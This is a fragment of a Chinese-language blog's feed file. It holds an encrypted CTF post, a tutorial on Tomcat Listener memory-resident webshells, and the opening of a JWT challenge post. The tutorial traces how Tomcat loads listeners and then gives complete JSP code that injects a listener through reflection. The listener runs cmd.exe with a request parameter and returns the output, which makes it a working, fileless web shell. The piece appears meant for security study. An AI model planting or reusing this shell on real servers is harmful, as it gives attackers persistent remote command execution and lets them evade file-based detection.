73d2b05dd9c6dfad3d39e49b34e8554b15015d6803c8999cecf999853c7cb9977668d48c71b345f93b3d2891107c8a5934d666cd1207030ff7d6df509b9579b382c5c199e3ee51ce2a645ffb37eac61bc6bc348d34dfa8e253aed1df925aec81e228ba49baa304efe6ff6d71cbdc31db2d97024a59656f13fa09b7a4a8f3d0f84d69d134142b8b5cdc4169fa4a9cc63f758902e682a82e921c766dd5200c87638afd688ec28b3efc9cb933b6211899e83d0775683317c2dfaf1ec429b9b6e4063d1cf8a84dbf9b3a90dd2e5dded7359a6e55c529f98b9898a0b5e6a4265b651c270d76342010ef6dddaebb26a0c678c7ba71b66bed092d103de7d637f2cfce1afc7a0757090ea3d29262d3bac90c887915514926bcf91054e00514d13d296bdc3d6443f20a1568b3b23323c485c9e9b21d3d8fb518e94d03b774990453aa4417f5cce99015cc129ec60935ac33d0cd83a1df0892a2b3480f23d531fe44333089fc5177996b627dd2cafb19522dcaf5c426440f10629a1e791ba4ec256927fd4361d576bcf7a37ba26c335ad11e2018ae141ad5091bae573bf8e79eeb3a48867e554c133786e34e7ae243f48d94c5d94faf63b3ee508e48fb99600fbda61f44735b72d6a52e1e3530c306e2b43bc4260f23266a75b429800769c6e1e70de5b8bc415215305cab8c1a342ec895cd1ba8c2b18cd78a28d613fcc9b5ef3f060f615d5103b4990ab50b708da28793a31015f4ff8c87e54b7512454c6858e167602dad95643a4f7e53543f290f73fb0baddbbd9cc10074a4b08ece3febfefe6cc24381eec69d859770b750798e90b78843aa9585678f5be2232e54822e6596f5c443d4ea69d73b75426196a19da3b6795efc5dfdb2c139e72066e938a789c1e1b4ec611f82c9115e49c5d580a46b860da0a47cafb1cfdde7a3e3562fd5e881d6d8667b3029c8cf8976f10b80e92659f209c252111147fce68bc0a8a8bce00fdc8b2a02c9d3e5402008fb4873c2abad6c47ee2c37d2e967b2fce3402ca9b0569c090f7e3993a2610950a4ba9c2fdf116231c34ef49a6b42befc2bb8ee0881b9b5fd1e8a9e62b13aee77f4b15ba5ab603ad83079ab6e1113cdf783611f062f610e748f063f2c1977b03dd534311073cbee17af232352514ce892edf15fb162c01198fcd6df6b5b1f8afb9e2735c44c0762442fa50ac2dd2def39f8ccf089000f1afc41747ffdc205a4a203f260451a0a1240383cd8784a1685a25695b6eaf821cc98b359ccb1e9f1421a8afa359cc8493d333491eb96c6388569c4a7d700c8bcb00ef4ebb9ab8faf84bcc36eb8f95a71f79957608ade2a8011bc2a6df33d9271408ee059982fe40e2e9cd2dc0785b9bae152b10e7617c58691bc3a7c6fb09c8a682c5f69ca231626db2c8f85d4fd08059bd4dbe9be0109b307c623de10df352c579839ba1aaeb74d219a06bd4e25aac5bcc8e824c90831772be6e5c2eff3c0b7c1dbfbb6a5a98131c1cae588449fdde638b1db0c5ff60bdb6cdc12055b34da9ca3d700ab80201d89154fea347ac95fa28b62931e7cd93d2bd77749c26f26b6dc3b05a66f54709524de735ec748cc6c0cabe019e0719fd6c5db482c1051acd84fe36609a463042e6689d8074216716d9f2ea30bb1228f50fea852905c285453524d9fbe181aa693caa71657f2aa718adf7e4219eaf94ece18c5ddfe515229d966151be4285b89135301e936a1c6e6a10b376e5526697ce23832f9a3b422b9b13b1b30e542b38aabaab7f1ade3ad6297712faaf0c4f227579b27cc6ae90c9538dfd71a2e5a40a81deb50633839fa0ca518c7da63c6792fff0b014f413a443ce66605a8efed0b236b2ebb39c804e73ca681eb58d22e0bff4ea97a73a1a8167ccd401b60ca745caa455cb55588477ffcc2d3fd0e2bffd60f3816ac35897d7101e35b48b3f02e08e6eae9f70bd010bcafc17f9b2c6487e7de05728415ef6aac45c50815963773c652dc40b1ca20bac9f352bbb4abb56052b7b509a015eb015725cdc41e28285eda547bc663f888e4ba7e9b2ab9816bc114fe582459cbbbd38543cde2365fcdda93fe0a133e99f11eed990423f83453d933b9586bdbc6d4ad158d27f3beac49910763d492f0ee295149c383b049ea46de907da5ac8aff75ba7d49246314f7f097892be68a08ece8557997ad2df2a185060d8faaaa88ce63670d40f52e540ae92035149670313c440dcc89fc64f8d6e5eec31827a385ccbd4c55763c43e5b6ddfe29a514fdd8cbc6a0f756b3fbc1305d0b574d77c9afcc0104147d6a51fc01b1b226b20984c78baa8b894fda58421cff5f87f6a146d340a22fe07104c283fb1593de7ceb846e09b8cbe97e1abdf2ed04c640917abdf91eb25e2c183115c8377c63203e85fc7c0b39c2bc84a27800100ee04a5296a2d088333b14853929bc71cec2930d1caa60b47c77dbb5c74b99288c6e485a1f85885210287afe0b5bedfb6da7ee6ca16c93faf2b1cfe7ea33ed0e64a3d861bae7644b367288297294ac46f4646e3dc4cdeae1af4be5e83577d1685a15638ee57cd3e47ff04c77f99e8fe3209f84230d42ceeb3c04a10b8fee30be09be30b7479f4e4cb3d9577d035b301c9d7e543512305d056ef8812f24d9f13c9c0590eaf12f603e6be2a2fe86dd57d269339a437033cf3fc157313d0a89d256d01b9ad1ab33c8b699b6c05ae5be38a5d439e2487f80a4228606d361efc6936ff6cdb2e028e19d8f29f43921afdbcfbffc35e3961303c6a9eb7986ac598ff838066e36dc62c43f0af05717aeb9e593e0083b9550a5bfbceea9e5c8d5fdfa22239b87762744dca96a671da5f624f3bbc77c867df280a37c6ef895cb0d16fe0973dfc91c6de2c1e3c7d13ac0c94e5b82c259b7526bc8d2968e0b66dad7ac7af8e4baf687e1f0da482b3b9500aec7ebc6d637ea5e23391f9323773d0cad840b09fa283aa4f86f7039b58b3d254b18f0b479ab0f486cc2f7732d836689e2dcc1088ad88812aade324648c72ea4d53446ca10ab0c75b85b95a7a8b9775816ffc4c276b7a57eb95da76ee3f8ed07a2029c50a742c0c581c32ed38d4ced2cc4fd562e499ffeb3a930defe8b81fec9fbac0a73c8e50b657a9c90b654ef0dc0a1c6177f22901f4945688ef08640e2b39e7ce4423375d32ab0eb6a9ee733cac89afcfacda2d9caed62c780d2802499229870c64e0a69fb0a6024539a70e9554a380589f5a42617d646fa4c9f675c4f4c23eac4369aa8aeab719a07380c41a3c40655c7450181baef7ee7357fed8245737db7a159df3722f87391dfe7f89ede8b1d28c1f34e84090c437974d42c0f36e92183d25ded701e8c198356ea77bbc10fcb0fd06a40047954927d1216b4258f788bae215079e881f3cb8e4f2953e809b03d85f5fe8122e9bf7f30641a1e742fe453327e7ec0e0a7dba9322210b3cec125e72d462d719ed9eb61f01393ac6c41f28ee7c155dda7bd051995523b4927f4b69eaf2aba3c8bae1941033c323ed06fe1802d69d2cb7c1007a8323e1921e98a473d1f27ad3f36fee34e7ca4d21ce490e920080c603a594bdb9a9c488af8ab196acb17f13e4ae8b3fc59450483eb2c3326772891c706385abc0a8044ae5574adf62c855f5d41d446e3ed2d203beccdbe31a1edf50263c209631c845345091b7612ae55e40e7ba00a87f8ef4910cc41d0dc91ae34804f39533200b71eea04dc43338c454e1b22552d1274e0a24dc0f0d24816de5e5f3794bb5e464e291347b71fc0c4da702385abaad26f23bd7f766815cc51a58d865288809ad1514ef26cab96b21cc4b2e2580bce69e1e7252a58450326cfb2ccae3c1e71a5156d3620a6ff8eb9b6213434499c1c76153744503179dcd715ee8e2fc44dd7a771879f042417bbd5395c1864483f40f80f845f730302aeae0976b44041497c0255c1f7fee6f095b4a4a45d1bea5b5eedc554480df02cff6fba383688a7f6a0215090f8db767205a1b388ce8545d17762ad735ccb8b7149a32f0b488cdc08f160eb39f776573e98eddcc202f93309c35ccd25018709744d82ec3d7f2986cbf709748208a8ea681e362f41592976bb8c03d73e24a12d6eba385c918e9e14b724877ec6f8d50f2e375cd0749f172f078cba852f2b725ab6a3acd78682be2ff49fb0b7fec11b94363e8657a6dcdfd226ac0f4208fcf6281c103563d9fec8fadac49dc4fd785a94bcde1578f29f30979e4d8ac0dd5a7a7dc9f1d6074b0d348d9abc5431b0fcd5bd4a25dc0e9c965f32a699e5b0b6d6c0c3a64c22209bd2914297df967b5f47df8fd79124f33e9e754c5a24fa4b994cb10829786da16460184dad1b26180e3227703fe8f86eadc63e1e395328423e65a3b63e6773d30eaca2b5d206bb38ebccce7958499dcd1c1db7e0208a6f3984eacd8a7564b61d021dfacd6dc723c54c6dd595bca415cf3ed4f62b0ec12cebd2fa08f134a0460fd8dd7a66649b78fb88d1957556fe90be9053b28cae1e643fc91db44ea220b7d30a329ada7404a1a120e5870b3252f6c996822a226303aac93f133bd7bb5cf166f5662d07f7c3fa1b27679f2d57b24db2fdceaafbe9bd50f8439a72b652029fc1fd2484f218e8f69a1ce57f0532c4aae299bd0aaf83ba7845b05115f6117ab1cac3da89da7301ed2c57ac0f34afc324d96d69ec5ea46ac0461cc0fc558815b3d70ded3231f163792eb51a65f2c5ded9bf61c434328ddbdb0811b9c6fb0b8d2905708aee1d25c28021f8e205ceb7308763a2fd6d3c1864444a07ef6f30154ab81a4e244d50d5203b4e322d5813fa4bbccac89c03add200894ef5578be0d505ffec91d2670fc6c2dfb24a8fd2b3cfe30bd28a12041284f76bfcbc6126a5c09816ecb1e242b7c8b2378777d268fafdebff0a265159ca808f7f6e98bad404068080d11d412d5eb74b03a834cc869f16784c8af1289eb710d567f09c5358e74e5b396e6471135f11f1cc64464b55e06ba4152e455f162df7b7c67d54c6da6755ade626852e005d5d076340a96ee15518b778ca70a8c26d222be338bfaa916a75d686108ba21be77584aee84ac52d1089bd7d81f42ccae7eb08b344c14b193e7996c276ba558d22da8c9e56607059ea1ae9aded776472a88d73705dde5a4e51c95b7cd176761c4a118fe3703eb7de73ea28d2fe0156e7b88c69983d54fb23332ab940a1e816f2ab4a69fd1aafc99deebfbe7dc9431ba2e888e2933481a5a5bc798139341d565eced58221988201f0b15d8a8c7988bd5d0d752ac814d54beaa670775e8541f5ccd95967529839e0a61c958cd9bcb0e6aa19ecbd0a90be39b1ed9878d632c71c1872e06f7dd2c04a1fee259140e28e1c043c8a2f3dac60eab43d913206d97451aefac326bc0b32dceafdfb4f2d787ed8652c76eab8e9a3e62ee49d5bbbe85749c46243d28c4e923d9c48322ed9340e2ecaade632fe90c358da9ab523b86cf7358e624c6f355bbe63220eec525ced8d1579d33385f411f5577192586da7e881c6fbdd52c7025b3d426901a9ae4fa565a6fdb01fa82d9e8dce13a05d58b5537d3079299e240b363169a7d7a188edbd3255996af31c0cb8988a21daedd260751195590c6862bae0da1b154375efc6bb1fce022047065e1f91d72077dc261a55db339021be3aeab35436495180d6d7a732c153bda7d368cc3b0c41f55b9adfcd02af49f05be3665f75217fa96784bce6978600f45eee06c93c06b756c758d948a64d4057dc9bba4d5db72608e2bc06ae30f9cccfcfbf04cec05ed12de907174bcc12a3281bd47aec673e64ab6326e526c93bf95c92183305635808fe2892e54135716b84d89e514bc253b1454dec336937b638281ac5da273c505c9ac60d8355625b93ef558bcf6fa6c457bd3f7940bf3c2165ec711b15b4b72022fab348fa7cd9d9dc429aa6a3eccfa1c4dadcfe0779ae1923143dc6fa2fdd1c943e967d159a62f24162b0abcb67852960e1385a20bec9654ef8533969c095ddb364603932c126de17cf8f20f3cfde4454047fca6228ed43d84ece0c843b7dce6b4999a876786a330c67f8ea351d232b698da05048769204702316b5f5246f541e13a49e6cfb32497578ba86ef3cb0eebc5cb025e47c3076060bc433600e6a066f3415572bd6b3a9bd2063ca77b3e124d7b25537e828af3ff039d9d539bf3eff308e62d604cc29a39752e92a08a46df455d555eb2899d219b1d8914507db9cc064bb4d6512fc6460cbc027cb03b018a11085c94a7af23ecb628b8ba7516a807a58cd825f391abf296cc2d0b573c82fd4405353c82851a1e5fd7ebbf090d80bb12f8705a41ef2abf259d487bad769c048a208d64803943109cd8494d2491ffc6092a76928883408c835ed5b98efd892bc744dc2479bcf672209d007432e1f534b260a4850886944aaeb9255b774ae13f0c042c5b9d48dc97ea002ab976c25d250b7c0855a4301200adbba0d10e3ed6214b3d4f04f0925d2c451e69a5f111b4ae61186afeef56fd0f5fc279f2c8c5705814755783b0032915aee40034deaedd380c3333401a37ed94556c56ab85188c93a8b6ab5c5023ed4d553c6294ccb66971fecc65bf9c213ec7551847ddf890f5b31ad7cf3b369a5718dd33884bd853b757d15870397df75d70a7b9066fb772373a1a44e805a2f6a0021ad0cb17387abc3599a1a68f014a20a540408fdfe86ba7577a962fc3adf24e51bc6ce94685c31a432803b87c42017e1807f3235a642c40503bbb37f8ac9fe66e8858aa223f1ac85af6e85d5955ff855d4168f39de5f168341b7db3bf048fde4f4558ae9f2f545ea79e8469bc153298153d452ec9975f77f90c9d8a681492a8b5e15c3e1d63ea56b5bb7127b643bf12890a54386fe9c5d9b2a81235ed7d852f23062f9e08426dd349719815ad6732d9d0d57149e3b4f46320b208cac1ac919023f767845a7da3c1afaeded31dbd12f22811aa557b945dd27d25d772b7958eac022707228addeacdbc3cd43336790d48f62875b27ee0c13e2718af49d901ff79de64173589652d2e03a2562fe86e72adc45b6a9a9bbe4f2874d507de5d7109e5094a1cee6583404cad9cbac1bcd8ac2098d0c17412a6e47fdc65d6bda79a64959d6baa6fead805e9cc647e234da8a0207b7436d9e42e7ca8aaaf60e691d734d8edfee32c33eb99d5339bcb0a7bae9c7dcd43e60a1aa2764e9287230ec8e121f121fb971c959820205983c1742b7e916560cd548641347c2ff2e78b6b0e5230edb7f5521d7f5bdb940d278e90f3bee04999a2ea8d193ad89759c9917f5875e4961108750d89d667b40d3b87cdb54e248fe184f9989b7c7739b89cdaaf3e88a7bffb2ab2b203d4c62eb4d2ac5e6ca3f38dd6ad9e4c722e2d4b449cca88d455b13161344535888fb80239ded73eb64d844abd0c503d8f904cf3182d93b68cf7aec8a7c9fb298c14761ec4eebe70ab2b62453be3c8a31f9019039b0597a3ea49cc6fe8df2191a50142671d65fd8a41dd759e7a097d584a165bf5d1060b0fa66f3258173d0d5417bdbcf9ac506f642bedbb56f1d4905fb7796b3d52c7dd76711af860ada7bbb192d256c0a5527d671cd96fd1a343bac8276a333a51517fdcde7526c556c415076f2957724937f0c64f74095b0a396e42ec3ced170ffa39a560a3da8331ce71cecd93d4f0e3b3f8d82c257051f63ff21db9bbcb3a4a0f025a8603ef40a76f27847fe78f9e2f836d084a8b63a4b4383fd47aa302e751495cb382e0846e1823fa2f6b7dd86815f5f93949eead76dc4a2ee8fd0b885ef099ff259a8f94125401936de7de54bf175a0d9151b9a78a62a9772d5bc416920d9e54acd08dde4c08162f07a2a037232e02b6eb23f15a2f0b79713c3cc0fd563bef5e1ba0177a45b94f73e103919ea533513f28999703bfa9e71d235e07f991c00ed2b76228e4daef87947916caf4c2cfaa6b16f7aea3e37f971ff4c72f60b0b439992948535bcbcac684144d1b3c0c44b67a9e11fadaccc91acaa05539f93f2db017208c591becac956b573486e78fe28ea3778148e0b97250e4ca88ab90c1b7e4e9d976f52963d882643626cad1870452e08d88406d59236a367418aaaef8612f8cd82f616fb47ae291bef7a1c040658a529300d5e7d8c7b97fe8263540f2a2fa38a58265772596eb6e4214779abed0f2d5a89104eaae0b047b733e30318541f2d3b2409114f5976cc1a0c1b8f20b04ffbc536c8325d177e4636f790b9e64637aed385db53df8f70642b2a21626d03667a5a52ac31524e7a5cb2bc4f00e826f7859c1aef5e9e2b1c846e431ae8dc05024e0897d5feee7980a0d4ddd4ba6a2245e124edcae45c59b7caac931cad3589ed2aafe87a08fd0b7994d39b06801adb233563a1c5f2a4d59874606e98f35c9ce4a90fd3ae65b73bbe7958a77914df26f9e2bbec2bb64a0906f7813de77cc1d892a9397d0603bea66c27dc8d60cdb0f32feda86d52c6bafba7c150f4245a06b9dde1a5d9a0b17b4af6894068cdf3efc6646e481c464cae4e18cddff8f067b396f84bfde4bc1030de616b56f3933ddb3d2b2426633cf2b394bb69400906bba82e44b09fb14fe7ca78b94a2e68101dfe539188bb5680030fe6d76db5c8e1d82e2d600bbf46381d806c4e5999b1e02d162c8a6be84d0c0bf8b9b594e60efea83da317af7beee35d487d90ae1d2c35702528a36e760e047ad7468fc870ebfb00e46272634915faf76e7b8c3cb00cb6c97e83968bc3992ec8b177ccd0a750302927efc70d888b253bea2a2a10312ecf56d056f4a29bf534caab29a9dd0717fefbc772811b51e34b481ad0aeb94e2f7549af5ffdaf92461394a74b13fbac185d9b240c6b0b77ddd6b0c2d29d44e6378045cc02065815a5a105a7c39db0c75ac2cc9c6373116969cabb170bc6b709caac3a8148e6027c0d7712ad8f68209e045dfa8803371b89b11c39249bdd343fd4c0da389f433e9deee8d30e3c058889e9ddc64a0e3077c2125ccae85b1e6a5621261b084c160a1161b952d0e8786f59fc690f61083274a6cce974d18162cac3bf2a79aaccd809b10d2a62ade859a4fb2eb9ca91e14d8bdee988bf327ea458a132f5e579d1ec0c933a4b79efa70778c02c88595b65a4c0e949af2a9c060592d0453e1690b542281c8825b0b7536cb7b2c8cee17cc4d627c323e27c7e5fff9d846b36e91c2f66721afcc7b248d648017733a8a0d30dae28da5dc43121a2a2fc15321dcf5f50f6216200195017807596a53c78714a5a86945cf188f01652130dc62eedec5beabb1549f28b9f619de0d015a65a96c311f9103bfea9c28e4c5e2645cf76fad8809210605eb78b336a0345634c76cba0fb21d4b6f80eb9a23f5c183f696df2791df7742fc04ccadd59b200a4d6d00aa7912ef87e853edf9c3aa57b3a041723873a4ef48d453a9ba0e5666405976e64705dfec19c9efdf881d346a89f856328e1291a2f727035c2fbb0da0d2a6f54735354370e87d51e27ffa57d3290b95049b94611c30592f496dd0bfdedebadb50ce70a4e111224023c14a86f7322baed6e616288800871e3432ae5a05c02d9d7299f33bb1b0f21e87315cfd340f274d8971c34dd5d5339b405f2712beb8458cf600f05891dd02e00d5843517df04af3bff18804974748c5c329979f49b0187b5faf0e4dc550db190e2634e577873580c8259365b90b5da240390a12ba1173f05bc16115b73799cec3d3c408e3b06a3f4a313e4242bd1b9233a7b65a55a3d72e407bee8749bc2fb0cc7caee2a43e5fc28e9875225fb1795fffdf2bf467456bb0546e9ed80e1e4cdc175dbe5305d0afbb6474bd9b9f692f4722bfb4974f4164211fd5ef854cc489188c49ceb190440c95c14313c448bff64a81b33a86be9003bcd47dd83b174533131de2b029b9a0b0258201fa2f7e59cf25adc4cbb3c97d70756ad6c8e1a4a6d8c425d53784082111a499221c19aaae2a4dd56680986a8c9f817adfbd74ad18f804771eb59c9a783b260a77f4f1c4930a520cd3c280b002072e93180871fce31347bd7d17a4e8880fd86e9546b756d14b61fb2b771a6ae238b6f755f8a21e9bdcdb76d5e502d80191951d8358f8a7f1491d0b54b28a34b7866173acbdf4fae4a7037229d101edb22720f4d96d716f3ae2d048a785c021a691c1e76a13532ea7873ef4907c48a777577b0ac16ff763de736b9493f4ee29bf84fbef0f126409623dab9a9b5cabf7a515d84e990e8984aa2a89b898765fe2e5bd3feb092dccd663b62a352484a5e57b2a6c4f99f5ea75c8c4c0e20db962afc952f7d7bbce454f7cbeae6c28e8b5fa8277efc840e306cf61b59c2ee0a02b18d3e0547825c6b38c3c8be5b5491cac58a349b6fd6fdf248a688fdf0d5d180d00f6f97c6259a4ff544246fe030f953310bf8ebb519879ddc4cd3cf8b94a4453a69e8cb56b983564f3c0a087d94c52d1a1485f421a0a95a9c9c1f594097d3f38c9ed5cdc7488a47383ad74f5acac812732e1f6f2d4744374519219696da718f91d0fa4dee5cdd0b6c6db2a1d84869ace225d4d793b6618ea00c193d630b0fc575da084a333535c729791318c056921398dceecdc91fc101ac0cb011e97a6211bd4d77a72fb9c99deb605d71959c2e7f8c6286e3fd8cdfbf79ff13cc20ae8086a6778d4aabb765332afc4617c48b950ba8bee79bc434bd5fe5157850916a29d3037a3fdea6976995c96a7c6024aaaec257b92c5a01f14fe3647d5fc41e2ca3665028bd8a314191834ae3caa2b4f7a5159f95ea1236e0a4a79d0e57364ddb841fe83c8c273c40fcdaa8873493225c312f9de4339876996a4aafe52ca68a97480923a4be5769f8daa37cdc613d2ea8886bca5f987d7af09f36615363f86c0c71a2890bf34f30441ad46d28d6b29864de06fa26dc9b4ce11101225d095422b76954249c1eacf7a100f1c9e0b570d1e1abd891cdfb7b5c34cbd46ff171b7463ce0ea1cd1b84a8592e6c7ea91a3b89f0a572428077f1030e0ee04daf015b881e52766eb18f1532be9e1f9afe55e35fd7cf974c2c2b4687f4007c09def3719474d29e16946b139f59f6228eb4c16fd3b37b7f9eced61d301cf69e306e0e87137cd129658ea83340a54649970c7bae193b4dfb4fb6b79139d77611c20293e5498a7322a501fa259f9a1c398e101af</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Listener内存马</title>
    <url>/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>讲解Listener内存马原理，和简单实现<br><span id="more"></span></p>
<h2 id="Listener加载原理"><a href="#Listener加载原理" class="headerlink" title="Listener加载原理"></a>Listener加载原理</h2><p><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/1.jpg" alt><br>还是这张图，Listener是在最开始就被创建的</p>
<p>Listener一共有8个监听器接口，但是由于内存马的特殊性，一般是在ServletRequestListener接口进行内存马注入，该接口用于监听 ServletRequest 对象的创建和销毁过程，而每次访问服务器都会触发此接口</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>前期准备可以看看Filter内存马的文章</p>
<p>先写一个Listener的容器，实现了ServletRequestListener接口，用注解的方式进行注册<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了TestListener requestInitialized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了TestListener requestDestroyed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在requestInitialized处打上断点，根据调用栈，可以知道是<code>context.fireRequestInitEvent(request.getRequest())</code>进行了初始化<br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/2.jpg" alt><br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/3.jpg" alt></p>
<p>context是由<code>request.getContext();</code>初始化，在后续利用需要<br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/4.jpg" alt></p>
<p>进入<code>context.fireRequestInitEvent</code>函数，可以看到是由listener进行了监听器初始化，且listener来源于<code>getApplicationEventListeners();</code><br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/5.jpg" alt><br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/6.jpg" alt></p>
<h2 id="内存马实现"><a href="#内存马实现" class="headerlink" title="内存马实现"></a>内存马实现</h2><p>通过上面的分析，我们可以知道，只需要往applicationEventListenersList中加入我们的Listener对象就可以了<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmdl&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    in = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> s.hasNext()?s.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestF.get(req);</span><br><span class="line">                    request.getResponse().getWriter().write(out);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (NoSuchFieldException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (IllegalAccessException e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">aELL</span> <span class="operator">=</span> context.getClass().getDeclaredField(<span class="string">&quot;applicationEventListenersList&quot;</span>);</span><br><span class="line">    aELL.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">List</span> <span class="variable">applicationEventListenersList</span> <span class="operator">=</span> (List)aELL.get(context);</span><br><span class="line">    <span class="type">MyListener</span> <span class="variable">listenerDemo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyListener</span>();</span><br><span class="line">    applicationEventListenersList.add(listenerDemo);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><br>根据前面的分析，context是由<code>request.getContext();</code>得到的，所以写内存马的时候也可以通过同样的方式获取</p>
<p>增加applicationEventListenersList，这里我是通过反射的方式获取到了private属性的applicationEventListenersList，然后进行了一次add<br>当然也可以通过context提供的成员方法进行修改<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">standardContext.addApplicationEventListener(listenerDemo);</span><br></pre></td></tr></table></figure></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://xz.aliyun.com/t/10358">https://xz.aliyun.com/t/10358</a></li>
</ul>
]]></content>
      <categories>
        <category>内存马</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
        <tag>内存马</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-jwt</title>
    <url>/2022/12/05/ctfshow-jwt/</url>
    <content><![CDATA[<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>jwt一共有三部分</p>
<ul>
<li>header</li>
<li>payload</li>
<li>signature<span id="more"></span>
</li>
</ul>
